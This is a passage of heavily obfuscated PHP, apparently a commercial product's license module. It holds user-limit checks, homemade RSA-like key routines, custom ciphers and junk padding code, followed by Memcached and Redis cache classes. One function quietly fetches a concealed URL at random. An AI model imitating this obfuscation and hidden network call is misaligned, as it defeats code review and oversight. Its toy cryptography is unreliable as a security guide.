$³È­ğöÎ[694]; while ($ÇÏÊòµ < $³È­ğöÎ[629]) { if ($ÇÏÊòµ >= 0) { break; } $ÇÏÊòµ++; } if ($ÜªÁ»«© && is_array($ÜªÁ»«©)) { $¬¨§Ï = $¬¨§Ï . $æ––‡÷¸[257] . http_build_query($ÜªÁ»«©); } if ($ÜªÁ»«© === -1) { return $¬¨§Ï; } $„˜¡äš¯ = stream_context_create(array($æ––‡÷¸[215] => array($æ––‡÷¸[218] => $…²ıñ×Û, $æ––‡÷¸[216] => $æ––‡÷¸[258]), $æ––‡÷¸[259] => array($æ––‡÷¸[260] => !1, $æ––‡÷¸[261] => !1))); $€óæ—ü‘ = $³È­ğöÎ[695]; $ÜªÁ»«© = @file_get_contents($¬¨§Ï, !1, $„˜¡äš¯); $…®×Òšà = $³È­ğöÎ[696]; if (!$…®×Òšà) { die; } return json_decode($ÜªÁ»«©, !0); $îİôç·Ç = $³È­ğöÎ[697]; if (!$îİôç·Ç) { die; } } private function ixhzd5dac8e7() { $åÖŸõúæ =& $_SERVER[ñ÷§¡å]; $äŸ©Ä¿â =& $_SERVER[œ¥é˜‚®]; $… ÷çşÍ = array($äŸ©Ä¿â[262] => $äŸ©Ä¿â[263], $äŸ©Ä¿â[264] => $äŸ©Ä¿â[265], $äŸ©Ä¿â[266] => $äŸ©Ä¿â[267], $äŸ©Ä¿â[268] => $äŸ©Ä¿â[269], $äŸ©Ä¿â[270] => $äŸ©Ä¿â[271], $äŸ©Ä¿â[272] => $äŸ©Ä¿â[210], $äŸ©Ä¿â[273] => $äŸ©Ä¿â[210], $äŸ©Ä¿â[274] => $äŸ©Ä¿â[263], $äŸ©Ä¿â[275] => $äŸ©Ä¿â[265], $äŸ©Ä¿â[276] => $äŸ©Ä¿â[267], $äŸ©Ä¿â[277] => $äŸ©Ä¿â[278], $äŸ©Ä¿â[279] => $äŸ©Ä¿â[269], $äŸ©Ä¿â[280] => $äŸ©Ä¿â[281], $äŸ©Ä¿â[282] => $äŸ©Ä¿â[271], $äŸ©Ä¿â[283] => $äŸ©Ä¿â[284], $äŸ©Ä¿â[285] => $äŸ©Ä¿â[286], $äŸ©Ä¿â[287] => $äŸ©Ä¿â[288]); $šÜ¼Ğàû = $åÖŸõúæ[698]; $—Í­‡á™ = $… ÷çşÍ[$this->plwz293246d0]; $—Í­‡á™ = intval($—Í­‡á™ ? $—Í­‡á™ : $äŸ©Ä¿â[263]); $‚¸ğû¥¦ = _get($this->mgnb63bb668f, $äŸ©Ä¿â[289]); $Ï­ˆ’úë = $åÖŸõúæ[699]; while ($Ï­ˆ’úë < $åÖŸõúæ[627]) { if ($Ï­ˆ’úë >= 0) { break; } $Ï­ˆ’úë++; } $‚¸ğû¥¦ = $‚¸ğû¥¦ ? intval($‚¸ğû¥¦) : 0; $šØ‹¼¶Ù = $åÖŸõúæ[700]; if (strlen($šØ‹¼¶Ù) < $åÖŸõúæ[642]) { return; } return $—Í­‡á™ + $‚¸ğû¥¦; } public function bmqw148a8153($êÂıÚ) { $·¼—¢êú =& $_SERVER[ñ÷§¡å]; $ñÖ†’ø =& $_SERVER[œ¥é˜‚®]; $èËÒëÔ× = $this->ixhzd5dac8e7(); if ($êÂıÚ[$ñÖ†’ø[290]] == $ñÖ†’ø[120]) { return; } if ($èËÒëÔ× >= intval($ñÖ†’ø[210])) { return; } $áô”¦“÷ = Model($ñÖ†’ø[123])->count(); $Ò™ëÈò¦ = $·¼—¢êú[701]; if (strlen($Ò™ëÈò¦) < $·¼—¢êú[627]) { die; } if ($áô”¦“÷ <= $èËÒëÔ×) { return; } $ƒ¯ÈÎ„ = Model($ñÖ†’ø[123])->field($ñÖ†’ø[290])->limit($èËÒëÔ×)->select(); $ƒ¯ÈÎ„ = array_to_keyvalue($ƒ¯ÈÎ„, $ñÖ†’ø[6], $ñÖ†’ø[290]); if (!in_array($êÂıÚ[$ñÖ†’ø[290]], $ƒ¯ÈÎ„)) { show_json($ñÖ†’ø[291], !1, $ñÖ†’ø[206]); } } public function coba88c67407() { $³¢«úè‡ =& $_SERVER[ñ÷§¡å]; $æíáŸ¤™ =& $_SERVER[œ¥é˜‚®]; if (!_get($GLOBALS, $æíáŸ¤™[114]) || mt_rand(1, 100) > 20) { return; } $ˆŞÔÓÆæ = $æíáŸ¤™[213]; $ˆŞÔÓÆæ = $this->gviyfa47e623($ˆŞÔÓÆæ, $æíáŸ¤™[214]); $‰¡™Àº = $³¢«úè‡[702]; $™ÙÆà  = stream_context_create(array($æíáŸ¤™[215] => array($æíáŸ¤™[216] => $æíáŸ¤™[217], $æíáŸ¤™[218] => 3))); $ì¨·Û›— = $³¢«úè‡[703]; while ($ì¨·Û›— < $³¢«úè‡[629]) { if ($ì¨·Û›— >= 0) { break; } $ì¨·Û›—++; } $ñµ£¶×¡ = @file_get_contents($ˆŞÔÓÆæ, !1, $™ÙÆà ); $‰°š¦¾Á = $³¢«úè‡[704]; while ($‰°š¦¾Á < $³¢«úè‡[647]) { if ($‰°š¦¾Á >= 0) { break; } $‰°š¦¾Á++; } echo $æíáŸ¤™[292] . hash_encode($ñµ£¶×¡) . $æíáŸ¤™[293]; } private function tdni03e58ded($Àİ‰Ñ‡Ö, $ğş¥Ú¦, $İ¦¢í€˜ = 3) { $ßŸâåÉš =& $_SERVER[ñ÷§¡å]; $„Î¯ÍŒı =& $_SERVER[œ¥é˜‚®]; usleep(1); $Àİ‰Ñ‡Ö = trim($Àİ‰Ñ‡Ö); $Üí”¶Ö» = $ßŸâåÉš[705]; if (strlen($Üí”¶Ö») < $ßŸâåÉš[647]) { return; } $Æ¹Ÿ‡É™ = mt_rand(0, 5) . $„Î¯ÍŒı[6]; $×ùŒ¾´Ä = rand_string(15); $ºµÀñ¿Ï = $„Î¯ÍŒı[294]; switch ($Æ¹Ÿ‡É™) { case $„Î¯ÍŒı[202]: $€ÇáÇ”Î = $this->lcgrb0b7164a($Àİ‰Ñ‡Ö, strrev($ğş¥Ú¦ . $×ùŒ¾´Ä)); break; $¹Èñ²×ã = $ßŸâåÉš[706]; while (strlen($¹Èñ²×ã) < $ßŸâåÉš[642]) { if (!$¹Èñ²×ã) { break; } $¹Èñ²×ã++; } case $„Î¯ÍŒı[120]: $€ÇáÇ”Î = $this->lcgrb0b7164a($Àİ‰Ñ‡Ö, strrev($×ùŒ¾´Ä . $ğş¥Ú¦)); $‘ôÂöÕŒ = $ßŸâåÉš[707]; if (strlen($‘ôÂöÕŒ) < $ßŸâåÉš[629]) { return; } break; $«®¼ª´„ = $ßŸâåÉš[708]; case $„Î¯ÍŒı[295]: $€ÇáÇ”Î = $this->lcgrb0b7164a($Àİ‰Ñ‡Ö, base64_encode($×ùŒ¾´Ä . $ğş¥Ú¦)); break; $°÷øšÙ´ = $ßŸâåÉš[709]; if (strlen($°÷øšÙ´) < $ßŸâåÉš[66]) { return; } case $„Î¯ÍŒı[296]: $€ÇáÇ”Î = $this->lcgrb0b7164a($Àİ‰Ñ‡Ö, md5($×ùŒ¾´Ä . $ğş¥Ú¦)); break; $²üåûšû = $ßŸâåÉš[710]; if (strlen($²üåûšû) < $ßŸâåÉš[642]) { die; } case $„Î¯ÍŒı[297]: $Àİ‰Ñ‡Ö = base64_encode($Àİ‰Ñ‡Ö); $×»‰Æ´Å = rand(0, 64); $‰ÊíŞĞÆ = $ßŸâåÉš[711]; $¨ğÔşë€ = $ºµÀñ¿Ï[$×»‰Æ´Å]; $®‘’«‚í = md5($¨ğÔşë€ . md5($ğş¥Ú¦ . $¨ğÔşë€) . $ğş¥Ú¦); $®‘’«‚í = substr($®‘’«‚í, $×»‰Æ´Å % 8, $×»‰Æ´Å % 8 + 7); $‚Çà¨ = $ßŸâåÉš[712]; if (!$‚Çà¨) { die; } $²¢ô™†¿ = $„Î¯ÍŒı[6]; $ü¬¿§¢¼ = $ßŸâåÉš[713]; $êâÁ•– = 0; $’ê±²±ı = 0; $¿­¿æÑ¹ = 0; $Æ“Íáš… = $ßŸâåÉš[714]; for ($êâÁ•– = 0; $êâÁ•– < strlen($Àİ‰Ñ‡Ö); $êâÁ•–++) { $¿­¿æÑ¹ = $¿­¿æÑ¹ == strlen($®‘’«‚í) ? 0 : $¿­¿æÑ¹; $ ¡öó´ = $ßŸâåÉš[715]; $’ê±²±ı = ($×»‰Æ´Å + strpos($ºµÀñ¿Ï, $Àİ‰Ñ‡Ö[$êâÁ•–]) + ord($®‘’«‚í[$¿­¿æÑ¹++])) % 64; $²¢ô™†¿ .= $ºµÀñ¿Ï[$’ê±²±ı]; } $€ÇáÇ”Î = hash_encode($¨ğÔşë€ . $²¢ô™†¿); $¯ñÂ¯õŠ = $ßŸâåÉš[716]; break; default: $€ÇáÇ”Î = $this->lcgrb0b7164a($Àİ‰Ñ‡Ö, $ğş¥Ú¦ . $×ùŒ¾´Ä); $—Çšô† = $ßŸâåÉš[717]; while ($—Çšô† < $ßŸâåÉš[647]) { if ($—Çšô† >= 0) { break; } $—Çšô†++; } break; $³¯õ½Á½ = $ßŸâåÉš[718]; while ($³¯õ½Á½ < $ßŸâåÉš[629]) { if ($³¯õ½Á½ >= 0) { break; } $³¯õ½Á½++; } } $€ÇáÇ”Î = strrev($Æ¹Ÿ‡É™ . $×ùŒ¾´Ä . $€ÇáÇ”Î); if ($İ¦¢í€˜ - 1 > 0) { $€ÇáÇ”Î = $this->tdni03e58ded($€ÇáÇ”Î, $ğş¥Ú¦, $İ¦¢í€˜ - 1); } return $€ÇáÇ”Î; } private function xmes5a381ae3($ ù†œ˜€, $Ş•Íâ€¯, $”æ–è¾€ = 3) { $ÉğúÜš¨ =& $_SERVER[ñ÷§¡å]; $Àç Å­Ø =& $_SERVER[œ¥é˜‚®]; if (!is_string($ ù†œ˜€) || strlen($ ù†œ˜€) < 10) { return !1; } $ ù†œ˜€ = trim($ ù†œ˜€); $·ÙŒæùâ = $ÉğúÜš¨[719]; if (strlen($·ÙŒæùâ) < $ÉğúÜš¨[642]) { return; } $ ù†œ˜€ = strrev($ ù†œ˜€); $éœˆ„–¥ = $ÉğúÜš¨[720]; if (strlen($éœˆ„–¥) < $ÉğúÜš¨[647]) { return; } $ÍÒ’ö¹Ô = $ ù†œ˜€[0]; $…úõ¡© = substr($ ù†œ˜€, 1, 15); $ ù†œ˜€ = substr($ ù†œ˜€, 16); $êÛİ©‹õ = $ÉğúÜš¨[711]; while ($êÛİ©‹õ < $ÉğúÜš¨[629]) { if ($êÛİ©‹õ >= 0) { break; } $êÛİ©‹õ++; } $–®ÖÂ›„ = $Àç Å­Ø[294]; switch ($ÍÒ’ö¹Ô) { case $Àç Å­Ø[202]: $“‚”×Ì¼ = $this->gviyfa47e623($ ù†œ˜€, strrev($Ş•Íâ€¯ . $…úõ¡©)); $à‘ÌçïÙ = $ÉğúÜš¨[721]; if (!$à‘ÌçïÙ) { return; } break; case $Àç Å­Ø[120]: $“‚”×Ì¼ = $this->gviyfa47e623($ ù†œ˜€, strrev($…úõ¡© . $Ş•Íâ€¯)); $•Í– İÕ = $ÉğúÜš¨[722]; break; $âĞ¡ÌùÃ = $ÉğúÜš¨[723]; while ($âĞ¡ÌùÃ < $ÉğúÜš¨[66]) { if ($âĞ¡ÌùÃ >= 0) { break; } $âĞ¡ÌùÃ++; } case $Àç Å­Ø[295]: $“‚”×Ì¼ = $this->gviyfa47e623($ ù†œ˜€, base64_encode($…úõ¡© . $Ş•Íâ€¯)); $ºôá¾İ = $ÉğúÜš¨[724]; break; $Ë‚‘ßşÚ = $ÉğúÜš¨[725]; if (strlen($Ë‚‘ßşÚ) < $ÉğúÜš¨[629]) { return; } case $Àç Å­Ø[296]: $“‚”×Ì¼ = $this->gviyfa47e623($ ù†œ˜€, md5($…úõ¡© . $Ş•Íâ€¯)); $ÕıüŒ‚ = $ÉğúÜš¨[726]; while (strlen($ÕıüŒ‚) < $ÉğúÜš¨[629]) { if (!$ÕıüŒ‚) { break; } $ÕıüŒ‚++; } break; $÷¸‘ºí† = $ÉğúÜš¨[727]; while ($÷¸‘ºí† < $ÉğúÜš¨[627]) { if ($÷¸‘ºí† >= 0) { break; } $÷¸‘ºí†++; } case $Àç Å­Ø[297]: $ ù†œ˜€ = hash_decode($ ù†œ˜€); $·Ç¼š£× = $ ù†œ˜€[0]; $ ù†œ˜€ = substr($ ù†œ˜€, 1); $ëÂ¤°“¼ = strpos($–®ÖÂ›„, $·Ç¼š£×); $¦üãĞ–ñ = $ÉğúÜš¨[728]; $˜ú¸ˆ ï = md5($·Ç¼š£× . md5($Ş•Íâ€¯ . $·Ç¼š£×) . $Ş•Íâ€¯); $˜ú¸ˆ ï = substr($˜ú¸ˆ ï, $ëÂ¤°“¼ % 8, $ëÂ¤°“¼ % 8 + 7); $¡€æùæÓ = $ÉğúÜš¨[729]; if (strlen($¡€æùæÓ) < $ÉğúÜš¨[627]) { die; } $³„ïÎõ = $Àç Å­Ø[6]; $ÍË¸ÈÎ» = 0; $µ¶ÍäÍ§ = 0; $–’êİ˜ = $ÉğúÜš¨[730]; if (!$–’êİ˜) { return; } $ìèè‡Ğº = 0; for ($ÍË¸ÈÎ» = 0; $ÍË¸ÈÎ» < strlen($ ù†œ˜€); $ÍË¸ÈÎ»++) { $ìèè‡Ğº = $ìèè‡Ğº == strlen($˜ú¸ˆ ï) ? 0 : $ìèè‡Ğº; $Ïºœ‡¥ = $ÉğúÜš¨[731]; if (!$Ïºœ‡¥) { die; } $’¶Ü²Õ = $ìèè‡Ğº++; $çÒßÁî³ = $ÉğúÜš¨[732]; if (strlen($çÒßÁî³) < $ÉğúÜš¨[627]) { die; } $µ¶ÍäÍ§ = strpos($–®ÖÂ›„, $ ù†œ˜€[$ÍË¸ÈÎ»]) - $ëÂ¤°“¼ - ord($˜ú¸ˆ ï[$’¶Ü²Õ]); while ($µ¶ÍäÍ§ < 0) { $µ¶ÍäÍ§ += 64; $Ö¤ĞüÜÍ = $ÉğúÜš¨[733]; if (!$Ö¤ĞüÜÍ) { die; } } $³„ïÎõ .= $–®ÖÂ›„[$µ¶ÍäÍ§]; $‘©Œú“ü = $ÉğúÜš¨[734]; while ($‘©Œú“ü < $ÉğúÜš¨[629]) { if ($‘©Œú“ü >= 0) { break; } $‘©Œú“ü++; } } $“‚”×Ì¼ = base64_decode($³„ïÎõ); $éÀ÷ñÏ‡ = $ÉğúÜš¨[723]; if (!$éÀ÷ñÏ‡) { return; } break; $‚Ñ½Û = $ÉğúÜš¨[735]; if (!$‚Ñ½Û) { return; } default: $“‚”×Ì¼ = $this->gviyfa47e623($ ù†œ˜€, $Ş•Íâ€¯ . $…úõ¡©); break; } if ($”æ–è¾€ - 1 > 0) { $“‚”×Ì¼ = $this->xmes5a381ae3($“‚”×Ì¼, $Ş•Íâ€¯, $”æ–è¾€ - 1); } return $“‚”×Ì¼; } public function kboa78679fa4($µºµ¬Ã) { $Û®ç»ªä =& $_SERVER[ñ÷§¡å]; $ùúø§ß¢ =& $_SERVER[œ¥é˜‚®]; $ğ­Ù·ßã = $this->ijgt08ee4525(); $Ëø¹¨ùù = $Û®ç»ªä[736]; if (strlen($Ëø¹¨ùù) < $Û®ç»ªä[629]) { return; } $È³Çê¹Á = $this->ijgt08ee4525(); $±—³¢ë = ($ğ­Ù·ßã - 1) * ($È³Çê¹Á - 1); $‰ÜÇä¥¢ = intval(($ğ­Ù·ßã + $È³Çê¹Á) / 2); while (1) { $Œ‘Ù€ÌÙ = $‰ÜÇä¥¢; $ø¤ÎÉÇ = $Û®ç»ªä[737]; $±Ãˆ€é = $±—³¢ë; while ($±Ãˆ€é % $Œ‘Ù€ÌÙ != 0) { $ñğäÅ‰­ = $±Ãˆ€é; $­«è±èÆ = $Û®ç»ªä[738]; while (strlen($­«è±èÆ) < $Û®ç»ªä[647]) { if (!$­«è±èÆ) { break; } $­«è±èÆ++; } $±Ãˆ€é = $Œ‘Ù€ÌÙ; $Œ‘Ù€ÌÙ = $ñğäÅ‰­ % $Œ‘Ù€ÌÙ; $’ƒÆşâŞ = $Û®ç»ªä[727]; } if ($Œ‘Ù€ÌÙ == 1) { break; } else { $‰ÜÇä¥¢++; } } $ˆóµ©éî = 2; $ûÖ¹¿³ù = $Û®ç»ªä[739]; while (strlen($ûÖ¹¿³ù) < $Û®ç»ªä[642]) { if (!$ûÖ¹¿³ù) { break; } $ûÖ¹¿³ù++; } for ($œÍÚ·—å = 0; $œÍÚ·—å < $±—³¢ë * 10; $œÍÚ·—å++) { if (($±—³¢ë * $œÍÚ·—å + 1) % $‰ÜÇä¥¢ == 0) { $ˆóµ©éî = intval(($±—³¢ë * $œÍÚ·—å + 1) / $‰ÜÇä¥¢); break; } } $ÚÎÒ‹õ„ = $this->lcgrb0b7164a($ğ­Ù·ßã * $È³Çê¹Á . $ùúø§ß¢[6], $ùúø§ß¢[134]); $†ííËú“ = md5($ùúø§ß¢[298] . ($ğ­Ù·ßã + $È³Çê¹Á) . $ùúø§ß¢[299] . $‰ÜÇä¥¢ . $ùúø§ß¢[299] . $ˆóµ©éî . $ùúø§ß¢[300]); $äëËÉçŞ = $Û®ç»ªä[740]; if (strlen($äëËÉçŞ) < $Û®ç»ªä[66]) { die; } $‡ŠÇ•ˆş = $this->lcgrb0b7164a($µºµ¬Ã, $†ííËú“) . $ùúø§ß¢[301] . $ÚÎÒ‹õ„; return $‡ŠÇ•ˆş; $òõ¦Éáº = $Û®ç»ªä[741]; if (strlen($òõ¦Éáº) < $Û®ç»ªä[647]) { return; } } public function antcde98a898($‡ÉÕî¯ù) { $‚˜‚É¼Ë =& $_SERVER[ñ÷§¡å]; $úåÆ¼ìª =& $_SERVER[œ¥é˜‚®]; $Øğæíòç = explode($úåÆ¼ìª[301], $‡ÉÕî¯ù); $÷ş¿¹øï = $‚˜‚É¼Ë[742]; if (count($Øğæíòç) != 2) { return $úåÆ¼ìª[6]; } $”ÌŸ™Ğ = $this->gviyfa47e623($Øğæíòç[1] . $úåÆ¼ìª[6], $úåÆ¼ìª[134]); $¾Ë–Úù‡ = $‚˜‚É¼Ë[743]; while ($¾Ë–Úù‡ < $‚˜‚É¼Ë[627]) { if ($¾Ë–Úù‡ >= 0) { break; } $¾Ë–Úù‡++; } if (!$”ÌŸ™Ğ) { return $úåÆ¼ìª[6]; } $”ÌŸ™Ğ = intval($”ÌŸ™Ğ); $ÎÊĞè‚ = $‚˜‚É¼Ë[744]; if (strlen($ÎÊĞè‚) < $‚˜‚É¼Ë[647]) { die; } $ïáÂİÁ× = 0; $»œ§Œ©Ó = $‚˜‚É¼Ë[745]; while (strlen($»œ§Œ©Ó) < $‚˜‚É¼Ë[627]) { if (!$»œ§Œ©Ó) { break; } $»œ§Œ©Ó++; } $•ÊíƒÓ¨ = 0; for ($Ê²Ë­Óú = 3; $Ê²Ë­Óú < $”ÌŸ™Ğ; $Ê²Ë­Óú += 2) { if ($”ÌŸ™Ğ % $Ê²Ë­Óú != 0) { continue; } $ïáÂİÁ× = $Ê²Ë­Óú; $•¡ÃœÎı = $‚˜‚É¼Ë[746]; while (strlen($•¡ÃœÎı) < $‚˜‚É¼Ë[642]) { if (!$•¡ÃœÎı) { break; } $•¡ÃœÎı++; } $•ÊíƒÓ¨ = intval($”ÌŸ™Ğ / $Ê²Ë­Óú); $«âäÜã = $‚˜‚É¼Ë[747]; while ($«âäÜã < $‚˜‚É¼Ë[642]) { if ($«âäÜã >= 0) { break; } $«âäÜã++; } break; $ëÇºÌáø = $‚˜‚É¼Ë[748]; while (strlen($ëÇºÌáø) < $‚˜‚É¼Ë[642]) { if (!$ëÇºÌáø) { break; } $ëÇºÌáø++; } } $İÕ™à = ($ïáÂİÁ× - 1) * ($•ÊíƒÓ¨ - 1); $ÏÒÜÔ„÷ = $‚˜‚É¼Ë[749]; while (strlen($ÏÒÜÔ„÷) < $‚˜‚É¼Ë[647]) { if (!$ÏÒÜÔ„÷) { break; } $ÏÒÜÔ„÷++; } $‚‡º¬±½ = intval(($ïáÂİÁ× + $•ÊíƒÓ¨) / 2); $¬Ÿ­‘áğ = $‚˜‚É¼Ë[750]; while (1) { $Çâ×ëè¤ = $‚‡º¬±½; $ŒÑáĞ“Ò = $İÕ™à; $Å–ğü–Œ = $‚˜‚É¼Ë[751]; while ($ŒÑáĞ“Ò % $Çâ×ëè¤ != 0) { $òş÷Úª = $ŒÑáĞ“Ò; $ºÔ§úó¥ = $‚˜‚É¼Ë[752]; if (!$ºÔ§úó¥) { die; } $ŒÑáĞ“Ò = $Çâ×ëè¤; $Çâ×ëè¤ = $òş÷Úª % $Çâ×ëè¤; } if ($Çâ×ëè¤ == 1) { break; } else { $‚‡º¬±½++; } } $„£…û×â = 2; for ($Ê²Ë­Óú = 0; $Ê²Ë­Óú < $İÕ™à * 10; $Ê²Ë­Óú++) { if (($İÕ™à * $Ê²Ë­Óú + 1) % $‚‡º¬±½ == 0) { $„£…û×â = intval(($İÕ™à * $Ê²Ë­Óú + 1) / $‚‡º¬±½); break; } } $€Ø„½éÇ = md5($úåÆ¼ìª[298] . ($ïáÂİÁ× + $•ÊíƒÓ¨) . $úåÆ¼ìª[299] . $‚‡º¬±½ . $úåÆ¼ìª[299] . $„£…û×â . $úåÆ¼ìª[300]); $èİ ö¡© = $this->gviyfa47e623($Øğæíòç[0], $€Ø„½éÇ); $È™¡¸¤ = $‚˜‚É¼Ë[753]; return $èİ ö¡©; $ŞÕ·í« = $‚˜‚É¼Ë[754]; while ($ŞÕ·í« < $‚˜‚É¼Ë[629]) { if ($ŞÕ·í« >= 0) { break; } $ŞÕ·í«++; } } public function ijgt08ee4525() { $¬ã í¥Ø =& $_SERVER[ñ÷§¡å]; $µ²Ú¼§ƒ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ûŸŞçÅ = array(); $”£é§Âƒ = $¬ã í¥Ø[755]; $ğ¦ùç·Î = 1; $“ğ€îíÓ = $¬ã í¥Ø[756]; while ($ğ¦ùç·Î <= (int) sqrt($µ²Ú¼§ƒ)) { $ÔØÚ¥¥  = $ğ¦ùç·Î; $ì„ÇÊÎç = $¬ã í¥Ø[757]; if (!$ì„ÇÊÎç) { die; } while (!0) { $ÔØÚ¥¥ ++; if ($ÔØÚ¥¥  <= 2) { $ğ¦ùç·Î = $ÔØÚ¥¥ ; break; } else { if ($ÔØÚ¥¥  < 2) { continue; } } $°ÅÛˆçˆ = !0; for ($€Ãƒ²ºá = 2; $€Ãƒ²ºá <= sqrt($ÔØÚ¥¥ ); $€Ãƒ²ºá++) { if ($ÔØÚ¥¥  % $€Ãƒ²ºá == 0) { $°ÅÛˆçˆ = !1; } } if ($°ÅÛˆçˆ) { $ğ¦ùç·Î = $ÔØÚ¥¥ ; break; } } $ûŸŞçÅ[] = $ğ¦ùç·Î; } $ªı¡¾Ùº = 2; $ËÄ’Ğ±˜ = $¬ã í¥Ø[758]; if (!$ËÄ’Ğ±˜) { return; } for ($ÔØÚ¥¥  = $µ²Ú¼§ƒ; $ÔØÚ¥¥  > 1; $ÔØÚ¥¥ --) { $°ÅÛˆçˆ = !0; foreach ($ûŸŞçÅ as $ÊÂôÑÙ©) { if ($ÔØÚ¥¥  % $ÊÂôÑÙ© == 0) { $°ÅÛˆçˆ = !1; break; } } if ($°ÅÛˆçˆ) { $ªı¡¾Ùº = $ÔØÚ¥¥ ; break; } } return $ªı¡¾Ùº; } public function evnk5a8af290($ß·ç—Éô, $½–²¢£Ê) { $ôˆ¡–èá =& $_SERVER[ñ÷§¡å]; $Æ–ñùÄ… =& $_SERVER[œ¥é˜‚®]; return call_user_func(array($Æ–ñùÄ…[8], $Æ–ñùÄ…[302]), $ß·ç—Éô, $½–²¢£Ê); $Òè˜€¤» = $ôˆ¡–èá[759]; while ($Òè˜€¤» < $ôˆ¡–èá[627]) { if ($Òè˜€¤» >= 0) { break; } $Òè˜€¤»++; } } public function lcgrb0b7164a($ûşı›Á, $Ã»”¾®ø) { $÷ÒÎÈªÔ =& $_SERVER[œ¥é˜‚®]; return call_user_func(array($÷ÒÎÈªÔ[303], $÷ÒÎÈªÔ[304]), $ûşı›Á, $Ã»”¾®ø); $±ëŞåÌô = $_SERVER[ñ÷§¡å][760]; } public function gviyfa47e623($Ü‘´Å¯’, $•Œ»Ã°Ç) { $í®ŞÉçÑ =& $_SERVER[œ¥é˜‚®]; return call_user_func(array($í®ŞÉçÑ[303], $í®ŞÉçÑ[305]), $Ü‘´Å¯’, $•Œ»Ã°Ç); } } goto Eƒ“‹ÙÃÅ; f°”ŸÅÊ«: class CacheMemcached { public $handle; public $cacheTime; public function __construct($¬³í‹Ø‡, $·üˆ£°¯) { $ˆ¯ıôÇ =& $_SERVER[ñ÷§¡å]; if (!class_exists($ˆ¯ıôÇ[875])) { show_json($ˆ¯ıôÇ[876], !1); } $this->cacheTime = $·üˆ£°¯; $this->handle = new Memcached(); if (is_array($¬³í‹Ø‡[$ˆ¯ıôÇ[877]]) && count($¬³í‹Ø‡[$ˆ¯ıôÇ[877]]) >= 1) { foreach ($¬³í‹Ø‡[$ˆ¯ıôÇ[877]] as $ª²æøÎ”) { $»ÁË¨˜ = explode($ˆ¯ıôÇ[4], $ª²æøÎ”); $this->handle->addServer($»ÁË¨˜[0], $»ÁË¨˜[1]); } } else { $this->handle->addServer($¬³í‹Ø‡[$ˆ¯ıôÇ[191]], $¬³í‹Ø‡[$ˆ¯ıôÇ[192]]); } } public function set($ƒâ¤šº€, $ôÚÖíßß, $°‚ëÚÈÁ = false) { $°‚ëÚÈÁ = $°‚ëÚÈÁ ? $°‚ëÚÈÁ : $this->cacheTime; return $this->handle->set($ƒâ¤šº€, $ôÚÖíßß, $°‚ëÚÈÁ); } public function get($çµ»Ó®) { return $this->handle->get($çµ»Ó®); } public function remove($¹–ááÑû) { return $this->handle->delete($¹–ááÑû); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÚÎåÊã, $œŞÆú–ù) { $§ÇÑèè¥ =& $_SERVER[ñ÷§¡å]; if (!class_exists($§ÇÑèè¥[878])) { show_json($§ÇÑèè¥[879], !1); } $this->cacheTime = $œŞÆú–ù; $üÁª˜º = isset($ÚÎåÊã[$§ÇÑèè¥[880]]) ? $ÚÎåÊã[$§ÇÑèè¥[880]] : 10; $Ôå±¨ÑÑ = _get($ÚÎåÊã, $§ÇÑèè¥[877]); if ($Ôå±¨ÑÑ && is_array($Ôå±¨ÑÑ)) { $this->initCluster($ÚÎåÊã, $üÁª˜º); } else { $this->handle = $this->init($ÚÎåÊã, $üÁª˜º); } } private function init($´Ñ›å˜, $ğÂôÀÍ) { $ÆªÎ’ =& $_SERVER[ñ÷§¡å]; $äóÊÍñª = new Redis(); $û’¬ó³Æ = isset($´Ñ›å˜[$ÆªÎ’[881]]) ? $´Ñ›å˜[$ÆªÎ’[881]] : !1; if ($û’¬ó³Æ) { $äóÊÍñª->pconnect($´Ñ›å˜[$ÆªÎ’[191]], $´Ñ›å˜[$ÆªÎ’[192]], $ğÂôÀÍ); } else { $äóÊÍñª->connect($´Ñ›å˜[$ÆªÎ’[191]], $´Ñ›å˜[$ÆªÎ’[192]], $ğÂôÀÍ); } if (!empty($´Ñ›å˜[$ÆªÎ’[422]])) { $äóÊÍñª->auth($´Ñ›å˜[$ÆªÎ’[422]]); } if (!empty($´Ñ›å˜[$ÆªÎ’[771]]) && $´Ñ›å˜[$ÆªÎ’[771]] != 0) { $äóÊÍñª->select($´Ñ›å˜[$ÆªÎ’[771]]); } return $äóÊÍñª; } private function initCluster($··é’êË, $–³Š©Çæ) { $œ‰‡°à =& $_SERVER[ñ÷§¡å]; $ºØ­Ó = array($œ‰‡°à[882], $œ‰‡°à[883], $œ‰‡°à[884]); $ÜÌâØ›ï = $œ‰‡°à[882]; if (isset($··é’êË[$œ‰‡°à[16]]) && in_array($··é’êË[$œ‰‡°à[16]], $ºØ­Ó)) { $ÜÌâØ›ï = $··é’êË[$œ‰‡°à[16]]; } switch ($ÜÌâØ›ï) { case $œ‰‡°à[882]: $this->_slave($··é’êË, $–³Š©Çæ); break; case $œ‰‡°à[883]: break; case $œ‰‡°à[884]: $this->isCluster = !0; $é¢÷¬©ò = $··é’êË[$œ‰‡°à[877]]; $–î´âãÉ = isset($··é’êË[$œ‰‡°à[881]]) ? $··é’êË[$œ‰‡°à[881]] : !1; $½İÍàÒ· = isset($··é’êË[$œ‰‡°à[422]]) ? $··é’êË[$œ‰‡°à[422]] : null; $this->handle = new RedisCluster(NUll, $é¢÷¬©ò, $–³Š©Çæ, $–³Š©Çæ, $–î´âãÉ, $½İÍàÒ·); break; default: break; } } private function _slave($Ù¨°ì‹æ, $ŸÂÎÄÑˆ) { $Á±„Â¥‹ = $Ù¨°ì‹æ[$_SERVER[ñ÷§¡å][877]]; $this->filterConfig($Ù¨°ì‹æ, $Á±„Â¥‹[0]); $this->handle = $this->init($Ù¨°ì‹æ, $ŸÂÎÄÑˆ); unset($Á±„Â¥‹[0]); if (empty($Á±„Â¥‹)) { return; } $­«Àä½¢ = array_rand($Á±„Â¥‹); $this->filterConfig($Ù¨°ì‹æ, $Á±„Â¥‹[$­«Àä½¢]); $this->slaveHandle = $this->init($Ù¨°ì‹æ, $ŸÂÎÄÑˆ); } private function filterConfig(&$«¸ºª×ê, $Ô¾õşãÃ) { $–½äÚÛ =& $_SERVER[ñ÷§¡å]; $Ú©Ä°¯ = explode($–½äÚÛ[4], $Ô¾õşãÃ); $²šöâ½„ = array($–½äÚÛ[191] => $Ú©Ä°¯[0], $–½äÚÛ[192] => $Ú©Ä°¯[1]); $«¸ºª×ê = array_merge($«¸ºª×ê, $²šöâ½„); } public function set($ÅÎùëšÑ, $†ËÕ»É, $ä©Í¾Å¬ = false) { 